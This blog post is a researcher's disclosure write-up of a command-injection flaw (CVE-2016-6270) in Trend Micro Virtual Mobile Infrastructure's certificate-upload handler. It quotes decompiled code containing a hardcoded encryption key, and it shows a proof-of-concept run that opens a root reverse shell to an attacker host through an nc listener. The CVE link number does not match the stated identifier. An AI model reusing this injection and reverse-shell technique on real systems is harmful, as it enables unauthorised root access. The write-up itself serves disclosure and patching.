---
layout: post
title:  "Trend Micro Bug Hunting - Part III"
date:   2016-10-08 07:00:00
comments: true
categories: pentesting trendmicro
---


Trend Micro Virtual Mobile Infrastructure is affected by a remote command execution vulnerability. This vulnerability can be exploited by authenticated user on the web administration panel of VMI to gain remote command execution with root privileges.

From Trend Micro documentation:

> Trend Micro Virtual Mobile Infrastructure is a service that hosts independent workspaces for every user. A user workspace is based on Android operating system, which is accessible via Virtual Mobile Infrastructure mobile client application installed on an Android, iOS or Windows mobile device. Using the mobile client application, users can access the same mobile environment that includes all their applications and data from any location, without being tied to a single mobile device. The mobile client application preserves the original Android user experience by providing all the Android features and their controls to the user.

I recommend anyone running Virtual Mobile Infrastructure to update to version 5.1, available at the following location:

*  [Virtual Mobile Infrastructure 5.1](http://downloadcenter.trendmicro.com/index.php?regs=NABU&clk=latest&clkval=4968&lang_loc=1)

Trend Micro Advisory is available on their latest security bulletin: [Security Bulletin: Trend Micro Virtual Mobile Infrastructure (VMI) Remote Code Execution Vulnerability](https://success.trendmicro.com/solution/1115411)

#### Affected Versions

* Trend Micro Virtual Mobile Infrastructure up to version 5.0

### Authenticated RCE - Technical Description

The administration interface provides a way for administrators to upload certificates by going to Administration > Certificate Management. The interface uploads a certificate file then sends a reference to the uploaded certificate and the password to unlock that certificate.

To understand how everything pans out, you first have to understand how VMI server works.

The request is handled by the following Django code in ```vmi/manager/configuration/views.py```. We can see that the password is decrypted using a hardcoded key (```#$vmi4trend```) using Blowfish with PKCS7 padding, then a call to ```sendAndRecvCmd``` is made with the certificate filename and password as parameters.

{% highlight python %}
class SaveIdentifyView(APIView):
  def post(self, request):
    try:
      pw = decode_with_hex_bf_pkcs7(VMI.JS_ENCRYPTION_MAGIC_CODE, request.DATA['password'])
      file_name = request.DATA['filename']
      (ret, all) = sendAndRecvCmd(CMD.CMD_IMPORT_IDENTIFY_CLIENT_PFX, filename = file_name, password = pw)
      data = { }
      data['fail'] = len(ret)
      data['total'] = all
      desc = audit_log[AuditLogType.CERTIFICATE_MANAGEMENT]
      admin = request.user
      setAuditLog(desc, AuditLogType.CERTIFICATE_MANAGEMENT, admin)
      return generalJsonResponse(status.HTTP_200_OK, ErrorCode.SUCCESS, ret, data)
    except Exception:
      e = None
      logger.error(str(e))
      return generalJsonResponse(status.HTTP_400_BAD_REQUEST, ErrorCode.FAILURE)
{% endhighlight %}

The ```sendAndRecvCmd``` function is defined in ```vmi/manager/engine/api.py```. This function sends data to the local Redis server. The data being sent is composed of a command identifier and parameters to be used with that command. On launch, the server register a bunch of redis worker that listens for data being sent to Redis. Each worker will decide to execute a command based on the command identifier.

{% highlight python %}
class BaseCmd(object):

  def sendAndReceive(cls, cmd):
    return BaseCmd.sendAndReceiveEx(cmd, get_redis())
  sendAndReceive = classmethod(sendAndReceive)

  def sendAndReceiveEx(cls, cmd, redis):
    cmd.ret_addr = 'vmi_ret_addr_%d' % id(cmd)
    key = CMD.get_queue(cmd.cmd)
    redis.rpush(key, jsonpickle.encode(cmd))
    popped = redis.blpop(cmd.ret_addr, settings.VMIM['execute_cmd_timeout'])
    if popped is not None:
      return jsonpickle.decode(popped[1])
    logger.warn('timeout for cmd: %s' % jsonpickle.encode(cmd))
  sendAndReceiveEx = classmethod(sendAndReceiveEx)

  def send(cls, cmd):
    BaseCmd.sendEx(cmd, get_redis())
  send = classmethod(send)

  def sendEx(cls, cmd, redis):
    cmd.ret_addr = None
    redis.rpush(CMD.get_queue(cmd.cmd), jsonpickle.encode(cmd))
    sendEx = classmethod(sendEx)
    cmd = 0
    ret_addr = None

def sendAndRecvCmd(cmd, **kargs):
    return BaseCmd.sendAndReceive(GeneralCmd(cmd, **None))
{% endhighlight %}

The worker that receives the command is ```/vmi/manager/engine/management/commands/apns_worker.py```.

As we can see in the excerpt below, the password parameter is not sanitized and directly fed to an openssl command line. This can be exploited by injecting system commands into the password field to gain remote command execution.

{% highlight python %}
def handle_certificate(self, pfx_file, password):
  if os.path.exists(pfx_file):
    cmd = "openssl pkcs12 -in '%s' -clcerts -out %s -passin pass:%s -passout pass:" % (pfx_file, self.cert_tmp, password)
    (status, result) = commands.getstatusoutput(cmd)
{% endhighlight %}


I wrote the initial proof-of-concept using Python. You can get the code from [here]({{site.url}}assets/exploit_vmi.py).

<pre>
python exploit.py --rhost vmi --rport 8443 --lhost attacker --lport 4444 --username admin --password admin
[+] Login to https://vmi:8443/
[+] Successfully logged in.
[+] Uploading vmi.pfx to the server ...
[+] File uploaded successfully (7283f4f2-ae5a-4683-957f-348418a10c67.pfx)
[+] Sending payload ...
</pre>

And here goes your root shell :)

<pre>
nc -lvp 4444
listening on [any] 4444 ...
bash: no job control in this shell
[root@localhost /]# whoami
root
[root@localhost /]# pwd
/
[root@localhost /]# 
</pre>


### Conclusion

This is a nice example of a bug that only code review could have catched. First, the password has to be properly decrypted to even reach the `sendAndRcv` call which means it has to be properly encrypted in the first place. Nothing that tools like Burp or Zap could have picked up. Then this all redis worker path could have prevented proper identification of the bug.

Once again, Trend Micro vulnerability team was great in handling this coordinated disclosure.


### Disclosure Timeline

* 2016-05-11: Advisory sent to Trend Micro 
* 2016-05-11: Trend Micro acknowledge the issue
* 2016-05-20: Trend Micro provides a planning for the fix
* 2016-10-08: Trend Micro released a patch

### CVE Identifier

* [CVE-2016-6270](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5270) - Authenticated remote code execution by exploiting the vulnerability in which ```openssl``` is used directly with untrusted input within ```apns_worker.py```

### Exploit

* [Python PoC]({{site.url}}assets/exploit_vmi.py)
* Metasploit module - Will push it by this evening :)
